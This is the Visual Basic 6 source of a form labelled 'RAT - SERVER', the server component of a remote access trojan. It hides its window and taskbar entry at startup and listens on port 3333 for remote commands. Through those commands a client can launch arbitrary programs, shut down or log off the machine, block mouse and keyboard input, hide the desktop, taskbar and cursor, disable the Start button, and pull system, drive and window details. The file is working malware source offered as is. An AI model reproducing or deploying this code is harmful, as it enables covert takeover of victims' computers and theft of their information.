VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frm_server 
   Caption         =   "RAT - SERVER"
   ClientHeight    =   3720
   ClientLeft      =   60
   ClientTop       =   375
   ClientWidth     =   5175
   LinkTopic       =   "Form1"
   ScaleHeight     =   11085
   ScaleWidth      =   15240
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer MouseTimer 
      Interval        =   100
      Left            =   1320
      Top             =   120
   End
   Begin VB.Timer stimer 
      Interval        =   150
      Left            =   720
      Top             =   120
   End
   Begin MSWinsockLib.Winsock sockserver 
      Left            =   120
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label lblstatus 
      Height          =   375
      Left            =   240
      TabIndex        =   0
      Top             =   2880
      Width           =   2775
   End
End
Attribute VB_Name = "frm_server"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim status As Integer
Dim pro As String

Private Sub Form_Load()
On Error Resume Next
    Me.Visible = False
    App.TaskVisible = False 'invisible from task bar
    MouseTimer.Enabled = False 'funny mouse timer is disabled
    If App.PrevInstance = True Then Unload Me 'if server is already opened then unload new server
    Call portopen 'make port open to be connected by client
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
    Unload Frm_Chat 'unload the chat too
End Sub

Private Sub MouseTimer_Timer()
On Error Resume Next
    ValueOne = Int(Rnd * 800)
    ValueTwo = Int(Rnd * 800)
    Change = SetCursorPos(ValueOne, ValueTwo)
End Sub

Private Sub sockserver_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
    If sockserver.State <> sckClosed Then sockserver.Close
    sockserver.Accept requestID
End Sub

''''''''''''''''''''''''''RECIVE DATA FROM THE CLIENT'''''''''''''''''''''''''''''''''''''

Private Sub sockserver_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next

Dim rdata As String
Dim datalen As Integer
Dim data, pro As String
Dim progress

sockserver.GetData rdata
'MsgBox rdata

datalen = Len(rdata) 'Length of recived data
If datalen > 4 Then
    data = Mid(rdata, datalen - 3, 4) 'recived data length greater then 4
End If

Select Case data    'select the operation based on suffix

Case "3333" 'open/close - open program
    pro = Mid(rdata, 1, datalen - 4)
    Shell pro, vbMaximizedFocus
    sockserver.SendData pro & " Opened"
    
Case "1111" 'control - change computer name
    pro = Mid(rdata, 1, datalen - 4)
    ret = SetComputerName(pro)
    sockserver.SendData "Compter name changed as " & pro

Case "4444" 'open/close - play a sound file
    pro = Mid(rdata, 1, datalen - 4)
    ret = sndPlaySound(pro, 1 Or 2)
    sockserver.SendData "Finished Playing Sound"
    
Case "5555" 'mouse control - change double click time
    ' it sets the length of text one by one
    ' if the selected text has any charecter then int j will be zero else greater
    Dim j As Integer
    j = Mid(rdata, 1, 5)
    If j > 0 Then
       SetDoubleClickTime (j)
    Else
        j = Mid(rdata, 1, 4)
        If j > 0 Then
            SetDoubleClickTime (j)
        Else
            j = Mid(rdata, 1, 3)
            If j > 0 Then
                SetDoubleClickTime (j)
            Else
                j = Mid(rdata, 1, 2)
                If j > 0 Then
                    SetDoubleClickTime (j)
                Else
                    j = Mid(rdata, 1, 1)
                    If j > 0 Then
                        SetDoubleClickTime (j)
                    End If
                End If
            End If
        End If
    End If
    sockserver.SendData "Double Click Time Setted" 'acknowledgment
    
Case "6666" 'mouse control - set x,y position
    Dim X, xx As Integer
    Dim Y, yy As Integer

    xx = Mid(rdata, 1, 3) 'find x position
    If xx > 0 Then
        X = xx
    Else
        xx = Mid(rdata, 1, 2)
        If xx > 0 Then
            X = xx
        Else
            xx = Mid(rdata, 1, 1)
            If xx > 0 Then
                X = xx
             End If
        End If
    End If

    yy = Mid(rdata, 4, 3) 'find y position
    If yy > 0 Then
        Y = yy
    Else
        yy = Mid(rdata, 4, 2)
        If yy > 0 Then
            Y = yy
        Else
            yy = Mid(rdata, 4, 1)
            If yy > 0 Then
                Y = yy
            End If
        End If
    End If
        
    ret = SetCursorPos(X, Y)
    
    sockserver.SendData "Cursor Position Changed" 'acknowledgement
    
Case "7777" 'control - beep
    Dim f As Integer
    Dim freq As Integer
    Dim t As Long
    Dim ftime As Long
    Dim vbeep As Integer
   
    f = Mid(rdata, 1, 5) 'find frequency
    If f > 0 Then
        freq = f
    Else
        f = Mid(rdata, 1, 4)
        If f > 0 Then
            freq = f
        Else
            f = Mid(rdata, 1, 3)
            If f > 0 Then
                freq = f
            Else
                f = Mid(rdata, 1, 2)
                If f > 0 Then
                    freq = f
                Else
                    f = Mid(rdata, 1, 1)
                    If f > 0 Then
                        freq = f
                    End If
                End If
             End If
        End If
    End If
   
    
    
    t = Mid(rdata, 6, 9) 'find time
    If t > 0 Then
        ftime = t
    Else
        t = Mid(rdata, 6, 8)
        If t > 0 Then
            ftime = t
        Else
            t = Mid(rdata, 6, 7)
            If t > 0 Then
                ftime = t
             Else
                t = Mid(rdata, 6, 6)
                If t > 0 Then
                    ftime = t
                Else
                    t = Mid(rdata, 6, 5)
                    If t > 0 Then
                        ftime = t
                    Else
                        t = Mid(rdata, 6, 4)
                        If t > 0 Then
                            ftime = t
                        Else
                            t = Mid(rdata, 6, 3)
                            If t > 0 Then
                                ftime = t
                            Else
                                t = Mid(rdata, 6, 2)
                                If t > 0 Then
                                    ftime = t
                                Else
                                    t = Mid(rdata, 6, 1)
                                    If t > 0 Then
                                        ftime = t
                                    End If
                                End If
                            End If
                        End If
                    End If
                End If
            End If
        End If
    End If
    
    vbeep = Beep(freq, ftime)
    sockserver.SendData "Beep Finished"
    
Case "9999" 'message center
    Dim mtitle As String
    Dim mmsg As String
    Dim mcode As String
    Dim cntr As Integer
    Dim cntra As Integer
    Dim cntrb As Integer
    Dim buff As String
       
    cntr = 1
    cntra = 1
    cntrb = 1
        
    Do While cntr < 21 'select title
        buff = Mid(rdata, cntra, 1)
        If buff = "`" Then
            mtitle = Mid(rdata, 1, cntra - 1)
            cntrb = 0
            Exit Do
        End If
        cntr = cntr + 1
        cntra = cntra + 1
    Loop
    If cntrb = 1 Then
        mtitle = Mid(rdata, 1, 20)
    End If
    
    mmsg = Mid(rdata, 21, Len(rdata) - 27) 'message
    mcode = Mid(rdata, Len(rdata) - 6, 3) 'message code
    
    
    Select Case mcode 'message code
    Case "111"
        MsgBox mmsg, vbCritical, mtitle
        sockserver.SendData "Critical Message Displayed" 'acknowledgement
            
    Case "222"
        MsgBox mmsg, vbExclamation, mtitle
        sockserver.SendData "Exclamation Message Displayed" 'acknowledgement
        
    Case "333"
        MsgBox mmsg, vbInformation, mtitle
        sockserver.SendData "Information Message Displayed" 'acknowledgement
    
    Case "444"
        MsgBox mmsg, vbOKOnly, mtitle
        sockserver.SendData "OK Only Message Displayed" 'acknowledgement
        
    Case "555"
        MsgBox mmsg, vbQuestion, mtitle
        sockserver.SendData "Question Message Displayed" 'acknowledgement
    End Select
    
    
Case "8888" 'terminate
    
    Dim rtime As Long
    Dim message As String
    Dim code As String
    Dim aa As Long
    Dim bb As Long
    
    'code to find operation
    code = Mid(rdata, Len(rdata) - 6, 3)
    'message
    message = Mid(rdata, 11, Len(rdata) - 17)
    'extract time
    bb = 10
    aa = Mid(rdata, 1, bb)
    bb = 9
    Do While Not aa > 0 And Not bb = 0
        aa = Mid(rdata, 1, bb)
        If aa > 0 Then
            Exit Do
        Else
            bb = bb - 1
        End If
    Loop
    
    rtime = aa
    Select Case code
    Case "SSS" 'shutdown
        ret = InitiateSystemShutdown("127.0.0.1", message, rtime, True, False)
        If ret = 1 Then
        sockserver.SendData "Shutdown Success"
        Else
        sockserver.SendData "Shutdown Failure"
        End If
            
    Case "RRR" 'restart
        ret = InitiateSystemShutdown("127.0.0.1", message, rtime, True, 1)
        If ret = 1 Then
        sockserver.SendData "Restart Success"
        Else
        sockserver.SendData "Restart Failure"
        End If
    
    Case "LLL" 'log off
        ret = ExitWindowsEx(4, &HFFFF)
        If ret = 1 Then
        sockserver.SendData "Logoff Success"
        Else
        sockserver.SendData "Logoff Failure"
        End If
    End Select
End Select


''''''''''''''''''''''''''''MESSAGE WITH OUT SUFFIX'''''''''''''''''''''''''''''
Select Case rdata

Case "RESETSERVER"
    Call portopen
    
Case "CDOPEN"
    ReturnValue = mciSendString("set CDAudio door open", returnstring, 127, 0)
    sockserver.SendData "CD-ROM Opened"
    
Case "CDCLOSE"
    ReturnValue = mciSendString("set CDAudio door closed", returnstring, 127, 0)
    sockserver.SendData "CD-ROM Closed"
    
Case "DISPLAY PROPERTIES"
    Displayproperties
    sockserver.SendData "Display Properties Opened"
    
Case "MULTIMEDIA PROPERTIES"
    Multimediaproperties
    sockserver.SendData "Multimedia Properties Opened"
    
Case "ACCESSIBILITY PROPERTIES"
    Accessibilityproperties
    sockserver.SendData "Accessibility Properties Opened"
    
Case "DATE/TIME PROPERTIES"
    DateTimeproperties
    sockserver.SendData "Date/Time Properties Opened"
    
Case "DIALING PROPERTIES"
    Dialingproperties
    sockserver.SendData "Dialing Properties Opened"
    
Case "MOUSE PROPERTIES"
    Mouseproperties
    sockserver.SendData "Mouse Properties Opened"
    
Case "KEYBOARD PROPERTIES"
    Keyboardproperties
    sockserver.SendData "Keyboard Properties Opened"
    
Case "REGIONAL SETTINGS"
    Regionalsettings
    sockserver.SendData "Regional Properties Opened"
    
Case "ADD/REMOVE PROGRAMS"
    AddRemovePrograms
    sockserver.SendData "AddRemove Properties Opened"
    
Case "INTERNET SETTINGS"
    Internetsettings
    sockserver.SendData "Internet Settings Opened"
    
Case "SYSTEM PROPERTIES"
    Systemproperties
    sockserver.SendData "System Properties Opened"
    
Case "TASKBARSHOW"
    TaskBarShow
    sockserver.SendData "TaskBar Visible"
    
Case "TASKBARHIDE"
    TaskBarHide
    sockserver.SendData "TaskBar Hidden"
    
Case "DESKTOPSHOW"
    DesktopShow
    sockserver.SendData "Desktop Visible"
    
Case "DESKTOPHIDE"
    DesktopHide
    sockserver.SendData "Desktop Hidden"
    
Case "MY COMPUTER"
    MyComputer
    sockserver.SendData "MyComputer Opened"
    
Case "CONTROL PANEL"
    ControlPanel
    sockserver.SendData "ControlPanel Opened"
        
Case "PRINTER SETTINGS"
    Printers
    sockserver.SendData "Printer Settings Opened"
    
Case "SCHEDULED TASKS"
    ScheduledTasks
    sockserver.SendData "SheduledTasks Opened"
    
Case "NETWORK NEIGHBOURHOOD"
    NetworkNeighborhood
    sockserver.SendData "Network Neighbourhood Opened"
    
Case "RECYCLE BIN"
    RecycleBin
    sockserver.SendData "Recycle Bin Opened"
    
Case "FONTS"
    Fonts
    sockserver.SendData "Fonts Opened"
    
Case "DESKTOP"
    Desktop
    sockserver.SendData "Desktop Opened"
    
Case "FAVORITES"
    Favorites
    sockserver.SendData "Favourites Opened"
    
Case "RECENT DOCUMENTS"
    Recent
    sockserver.SendData "Recent Documents Opened"
    
Case "COOKIES"
    Cookies
    sockserver.SendData "Cookies Opened"
    
Case "HISTORY"
    History
    sockserver.SendData "Histroy Opened"
    
Case "CLKSHOW"
    ShowTime
    sockserver.SendData "Clock Visible"
    
Case "CLKHIDE"
    HideTime
    sockserver.SendData "Clock Hidden"
    
Case "STRAYSHOW"
    strayshow
    sockserver.SendData "SystemTray Visible"
    
Case "STRAYHIDE"
    strayhide
    sockserver.SendData "SystemTray Hidden"
    
Case "STARTCHAT"
   Frm_Chat.Show
   Frm_Chat.Visible = False
   sockserver.SendData "Chat Started"
   
Case "SHOWCURSOR"
    ShowCursor (1)
    sockserver.SendData "Cursor Visible"
    
Case "HIDECURSOR"
    ShowCursor (0)
    sockserver.SendData "Cursor Hidden"
    
Case "ENABLESWAP"
    SwapMouseButton (1)
    sockserver.SendData "Swap Enabled"
    
Case "DISABLESWAP"
    SwapMouseButton (0)
    sockserver.SendData "Swap Disabled"
    
Case "MINIMIZEALL"
    MinimizeAll
    sockserver.SendData "All Windows Minimized"
    
Case "STARTSCREENSAVER"
    runScreenSaver frm_server
    sockserver.SendData "ScreenSaver Started"
    
Case "SCROLLLOCKCHANGE"
    ToggleKeyScroll
    If GetKeyState(&H91) = 1 Then
        sockserver.SendData "SCROLL LOCK ON"
    Else
        If GetKeyState(&H91) = 0 Then
            sockserver.SendData "SCROLL LOCK OFF"
        End If
    End If
    
Case "CAPSLOCKCHANGE"
    ToggleKeyCaps
    If GetKeyState(&H14) = 1 Then
        sockserver.SendData "CAPS LOCK ON"
    Else
        If GetKeyState(&H14) = 0 Then
            sockserver.SendData "CAPS LOCK OFF"
        End If
    End If
    
Case "NUMLOCKCHANGE"
    ToggleKeyNumlock
    If GetKeyState(&H90) = 1 Then
        sockserver.SendData "NUM LOCK ON"
    Else
        If GetKeyState(&H90) = 0 Then
            sockserver.SendData "NUM LOCK OFF"
        End If
    End If
    
Case "STARTENABLE"
    Call enStart
    sockserver.SendData "Start Button Enabled"
    
Case "STARTDISABLE"
    Call disStart
    sockserver.SendData "Start Button Disabled"
    
Case "FUNNYMOUSESTART"
    MouseTimer.Enabled = True
    sockserver.SendData "FunnyMouse Started"
    
Case "FUNNYMOUSESTOP"
    MouseTimer.Enabled = False
    sockserver.SendData "FunnyMouse Stopped"
    
Case "WINDOWSRUNTIME"
   Dim winruntime As String
    
   winruntime = Mid(GetTickCount / 1000 / 60, 1, 5)
   winruntime = "WRT" & winruntime & " Minutes"
   sockserver.SendData winruntime
   
Case "GETWINDOWS"
    sockserver.SendData GetWindows
    
Case "MKENABLE"
    BlockInput False
    sockserver.SendData "Mouse/Keyboard Enabled"
    
Case "MKDISABLE"
    BlockInput True
    sockserver.SendData "Mouse/Keyboard Disabled"
    
Case "DRIVEINFO"
     sockserver.SendData GetDriveInformations
     
Case "GETSYSINFO"
    sockserver.SendData GetSysInfo
    
Case "ABTSHUTDOWN"
    ret = AbortSystemShutdown("127.0.0.1")
    If ret = 1 Then
        sockserver.SendData "Abort Shutdown Success"
    Else
        sockserver.SendData "Abort Shutdown Failure"
    End If
    
End Select
End Sub

Private Sub stimer_Timer() 'checks and show the status of socket
On Error Resume Next
status = sockserver.State
If status = 8 Then
Call portopen
Unload Frm_Chat
End If

lblstatus.Caption = status
End Sub

Private Sub portopen() 'make port open and listening for connection
On Error Resume Next
sockserver.Close
sockserver.LocalPort = 3333
sockserver.Listen
End Sub








